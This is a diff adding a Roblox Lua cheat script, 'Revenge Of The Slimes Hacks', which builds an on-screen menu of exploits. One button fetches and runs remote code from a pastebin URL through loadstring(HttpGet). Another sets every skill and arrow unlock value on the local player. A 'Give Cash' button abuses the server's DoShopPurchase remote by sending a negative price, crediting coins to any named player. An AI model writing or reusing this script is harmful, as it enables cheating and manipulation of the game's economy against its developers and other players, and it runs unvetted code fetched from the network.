@@ -1,0 +1,187 @@
+
+local ScreenGui = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Bows = Instance.new("TextButton")
+local SkillsArrows = Instance.new("TextButton")
+local Credits = Instance.new("TextLabel")
+local OpenMain = Instance.new("Frame")
+local CloseOpen = Instance.new("TextButton")
+local SlimeGui = Instance.new("ScreenGui")
+local SlimesFrame = Instance.new("Frame")
+local MoneyBox = Instance.new("TextBox")
+local SetitBoi = Instance.new("TextButton")
+local PlayerBox = Instance.new("TextBox")
+
+SlimeGui.Name = "SlimeGui"
+SlimeGui.Parent = game.CoreGui
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Main.Name = "Main"
+Main.Parent = ScreenGui
+Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Main.BackgroundTransparency = 0.400
+Main.BorderColor3 = Color3.fromRGB(44, 39, 39)
+Main.BorderSizePixel = 20
+Main.Position = UDim2.new(0.01, 0, -0.025, 0)
+Main.Size = UDim2.new(0.5, 0, 1, 0)
+Main.Draggable = true
+Main.Active = true
+
+Title.Name = "Title"
+Title.Parent = Main
+Title.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+Title.BackgroundTransparency = 0.400
+Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderSizePixel = 5
+Title.Position = UDim2.new(0.25, 0, 0.0253630802, 0)
+Title.Size = UDim2.new(0, 335, 0, 50)
+Title.Font = Enum.Font.JosefinSans
+Title.Text = "Revenge Of The Slimes Hacks"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextSize = 20.000
+Title.TextWrapped = true
+
+Bows.Name = "Bows"
+Bows.Parent = Main
+Bows.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+Bows.BackgroundTransparency = 0.400
+Bows.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Bows.BorderSizePixel = 5
+Bows.Position = UDim2.new(0.35, 0, 0.203187257, 0)
+Bows.Size = UDim2.new(0, 200, 0, 50)
+Bows.Font = Enum.Font.RobotoMono
+Bows.Text = "Give Bows"
+Bows.TextColor3 = Color3.fromRGB(0, 0, 0)
+Bows.TextSize = 25.000
+Bows.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/HTf9K4GN",true))()
+end)
+
+SkillsArrows.Name = "Skills/Arrows"
+SkillsArrows.Parent = Main
+SkillsArrows.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+SkillsArrows.BackgroundTransparency = 0.400
+SkillsArrows.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SkillsArrows.BorderSizePixel = 5
+SkillsArrows.Position = UDim2.new(0.35, 0, 0.39641434, 0)
+SkillsArrows.Size = UDim2.new(0, 200, 0, 50)
+SkillsArrows.Font = Enum.Font.RobotoMono
+SkillsArrows.Text = "Give Skills/Arrows"
+SkillsArrows.TextColor3 = Color3.fromRGB(0, 0, 0)
+SkillsArrows.TextSize = 25.000
+SkillsArrows.TextWrapped = true
+SkillsArrows.MouseButton1Down:connect(function()
+	local plr = game:GetService("Players").LocalPlayer
+    
+    plr.Skill1.Value = true
+    plr.Skill2.Value = true
+    plr.Skill3.Value = true
+    plr.Skill4.Value = true
+    plr.Skill5.Value = true
+    plr.Skill6.Value = true
+    plr.Skill7.Value = true
+    plr.Skill8.Value = true
+    plr["Arrow 2"].Value = true
+    plr["Arrow 3"].Value = true
+    plr["Arrow 4"].Value = true
+    plr["Arrow 5"].Value = true
+    plr["Arrow 6"].Value = true
+    plr["Arrow 7"].Value = true
+    plr["Arrow 8"].Value = true
+    plr["Arrow 9"].Value = true
+    plr["Arrow 10"].Value = true
+    plr["Arrow 11"].Value = true
+    end)
+
+Credits.Name = "Credits"
+Credits.Parent = Main
+Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Credits.BackgroundTransparency = 1.000
+Credits.Position = UDim2.new(0.8, 0, 0.130617425, 0)
+Credits.Size = UDim2.new(0, 117, 0, 35)
+Credits.Font = Enum.Font.SourceSans
+Credits.Text = "Credit to thedumgamerdude on YT"
+Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
+Credits.TextSize = 13.000
+Credits.TextTransparency = 0.900
+Credits.TextWrapped = true
+
+OpenMain.Name = "OpenMain"
+OpenMain.Parent = ScreenGui
+OpenMain.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+OpenMain.Position = UDim2.new(0.911280036, 0, 0.709163308, 0)
+OpenMain.Size = UDim2.new(0, 28, 0, 21)
+OpenMain.BackgroundTransparency = 1
+
+
+CloseOpen.Name = "Close/Open"
+CloseOpen.Parent = OpenMain
+CloseOpen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+CloseOpen.BorderColor3 = Color3.fromRGB(85, 85, 85)
+CloseOpen.BorderSizePixel = 5
+CloseOpen.Position = UDim2.new(0.5, 0, -0.978350401, 0)
+CloseOpen.Size = UDim2.new(0, 102, 0, 61)
+CloseOpen.Font = Enum.Font.SourceSans
+CloseOpen.Text = "Close/Open"
+CloseOpen.TextColor3 = Color3.fromRGB(61, 61, 61)
+CloseOpen.TextScaled = true
+CloseOpen.TextSize = 21.000
+CloseOpen.TextWrapped = true
+CloseOpen.Draggable = true
+CloseOpen.Active = true
+CloseOpen.MouseButton1Down:connect(function()
+	if Main.Visible == true then
+		Main.Visible = false
+	else
+		Main.Visible = true
+	end
+end)
+
+SlimesFrame.Name = "SlimesFrame"
+SlimesFrame.Parent = Main
+SlimesFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+SlimesFrame.BackgroundTransparency = 1
+SlimesFrame.Position = UDim2.new(0, 0, 0, 301)
+SlimesFrame.Size = UDim2.new(0, 357, 0, 139)
+ 
+MoneyBox.Name = "MoneyBox"
+MoneyBox.Parent = Main
+MoneyBox.BackgroundColor3 = Color3.new(0, 0, 0)
+MoneyBox.Position = UDim2.new(0.375, 0,0.576, 0)
+MoneyBox.Size = UDim2.new(0, 175, 0, 50)
+MoneyBox.Font = Enum.Font.SourceSans
+MoneyBox.FontSize = Enum.FontSize.Size14
+MoneyBox.Text = "Any Value here"
+MoneyBox.TextColor3 = Color3.new(0, 1, 1)
+MoneyBox.TextSize = 14
+MoneyBox.TextWrapped = true
+ 
+SetitBoi.Name = "SetitBoi"
+SetitBoi.Parent = Main
+SetitBoi.BackgroundColor3 = Color3.new(0, 0, 0)
+SetitBoi.Position = UDim2.new(0.325, 0,0.882, 0)
+SetitBoi.Size = UDim2.new(0, 256, 0, 45)
+SetitBoi.Font = Enum.Font.SourceSans
+SetitBoi.FontSize = Enum.FontSize.Size14
+SetitBoi.Text = "Give Cash"
+SetitBoi.TextColor3 = Color3.new(0, 1, 1)
+SetitBoi.TextSize = 14
+ 
+PlayerBox.Name = "PlayerBox"
+PlayerBox.Parent = Main
+PlayerBox.BackgroundColor3 = Color3.new(0, 0, 0)
+PlayerBox.Position = UDim2.new(0.39, 0,0.731, 0)
+PlayerBox.Size = UDim2.new(0, 160, 0, 47)
+PlayerBox.Font = Enum.Font.SourceSans
+PlayerBox.FontSize = Enum.FontSize.Size14
+PlayerBox.Text = "Any name here"
+PlayerBox.TextColor3 = Color3.new(0, 1, 1)
+PlayerBox.TextSize = 14
+ 
+SetitBoi.MouseButton1Click:connect(function()
+if game.Players[PlayerBox.Text] then
+game.Workspace.DoShopPurchase:InvokeServer(game.Players[PlayerBox.Text].leaderstats.Coins, -tonumber(MoneyBox.Text),"skill3")
+end
+end) 
